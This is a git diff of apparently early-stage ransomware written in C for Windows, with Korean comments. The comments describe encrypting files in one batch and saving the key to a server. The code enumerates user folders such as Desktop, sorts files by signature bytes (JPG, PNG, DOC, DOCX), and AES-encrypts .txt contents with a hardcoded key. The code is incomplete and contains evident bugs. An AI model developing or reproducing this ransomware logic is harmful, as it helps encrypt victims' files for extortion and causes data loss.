@@ -8,9 +8,15 @@
 #include "files.h"
 
 #define AES_BLOCK_SIZE  16
+#define SIGN_BUFF_SIZE  8
 
 // 파일 암호화 한테로 묶어 놓고 키를 서버에 저장해 준다.
 // 타깃을 구조체로 묶어 재분류 하라.
+// TODO : 파일 이름에 띄어쓰기가 있는 경우는?
+
+
+int txt_encrypt();
+void classifyFiles(struct FILES files, wchar_t *dir, wchar_t fileList[100][100]);
 
 int main() {
 
@@ -20,61 +26,78 @@ int main() {
     wcscpy(dirPrefix, L"C:\\Users\\");
     wchar_t *userName = getUserName();
     wcscat(dirPrefix, userName);
-    wcscat(dirPrefix, L"\\test_folder\\");
+    wcscat(dirPrefix, L"\\test_folder");
 
 
     wchar_t* dir = (wchar_t*)malloc(sizeof(wchar_t*)*100);
     memset(dir, 0, sizeof(wchar_t*) * 100);
     wcscat(dir, dirPrefix);
 
+    struct FILEDIR fileDir;
     struct FILES files;
+    files.doc_index, files.docx_index, files.jpg_index, files.png_index, files.txt_index = 0;
+
 
     //[1] Desktop
     wcscat(dir, DESKTOP_DIR);
-    getDirectoryFileList(dir, files.desktop);
+    getDirectoryFileList(dir, fileDir.desktop);
     for(int i = 0; i < 100; i++) {
-        if(files.desktop[i][0] == '\0') break;
-        printf("%S\n", files.desktop[i]);
+        if(fileDir.desktop[i][0] == '\0') break;
+        printf("%S\n", fileDir.desktop[i]);
     }
-
-    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
-    wcscat(dir, dirPrefix);
-    
-    // [2]  Downloads
-    wcscat(dir, DOWNLOADS_DIR);
-    getDirectoryFileList(dir, files.downloads);
-    for(int i = 0; i < 100; i++) {
-        if(files.downloads[i][0] == '\0') break;
-        printf("%S\n", files.downloads[i]);
-    }
-
-    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
-    wcscat(dir, dirPrefix);
-
-    // [3]  Documents
-    wcscat(dir, DOCUMENTS_DIR);
-    getDirectoryFileList(dir, files.documents);
-    for(int i = 0; i < 100; i++) {
-        if(files.documents[i][0] == '\0') break;
-        printf("%S\n", files.documents[i]);
-    }
-
-    dir = (wchar_t*)calloc(100, sizeof(wchar_t));
-    wcscat(dir, dirPrefix);
-
-    // [4]  AppData/Local/Temp
-    wcscat(dir, APPDATA_DIR);
-    getDirectoryFileList(dir, files.appData);
-    for(int i = 0; i < 500; i++) {
-        if(files.appData[i][0] == '\0') break;
-        printf("%S\n", files.appData[i]);
-    }
+    //[1] Desktop 분류
+    classifyFiles(files, dir, fileDir.desktop);
 
     free(dir);
     free(dirPrefix);
-
     
+}
 
+
+
+void classifyFiles(struct FILES files, wchar_t *dir, wchar_t fileList[100][100]) {
+
+    char buff_sign[SIGN_BUFF_SIZE];
+    DWORD readn;
+
+    printf("================================================================================================= \n");
+    printf("                                      Classify Files start                                        \n");
+    printf("================================================================================================= \n");
+
+    for (int i = 2; i < 100; i++) {
+        if(fileList[i][0] == '\0') break;
+        
+        HANDLE file1 = CreateFileW(fileList[i], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (file1 == INVALID_HANDLE_VALUE) {
+            printf("file1 open error\n");
+            return;
+        }
+        ReadFile(file1, buff_sign, SIGN_BUFF_SIZE, &readn, NULL);
+        
+        if(!strncmp(buff_sign, JPG_SIGN, 4)) {
+            wprintf(L"\n JPG fileList[%d] : %s \n", i, fileList[i]);
+
+        } else if(!strncmp(buff_sign, PNG_SIGN, 8)) {
+            wprintf(L"\n PNG fileList[%d] : %s \n", i, fileList[i]);
+
+        } else if(!strncmp(buff_sign, DOC_SIGN, 4)) {
+            wprintf(L"\n DOC fileList[%d] : %s \n", i, fileList[i]);
+
+        } else if(!strncmp(buff_sign, DOCX_SIGN, 8)) {
+            wprintf(L"\n DOCX fileList[%d] : %s \n", i, fileList[i]);
+
+        } else if(buff_sign == ".txt"){
+            wprintf(L"\n txt fileList[%d] : %s \n", i, fileList[i]);
+
+        } else {
+            wprintf(L"\n nothing fileList[%d] : %s \n", i, fileList[i]);
+        }
+
+    }
+}
+
+int txt_encrypt() {
+    
     uint8_t key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };
 
     // 키 램던 생성
@@ -83,7 +106,6 @@ int main() {
     //     key[i] = rand() % 0xff;
     //     printf("0x%02x ", key[i]);
     // }
-
 
     uint8_t iv[]  = { 0x00, };
     unsigned char* buff_txt;
@@ -155,8 +177,6 @@ int main() {
         buff_txt = calloc(AES_BLOCK_SIZE, sizeof(unsigned char));
     }
     
-
-
 }
 
 
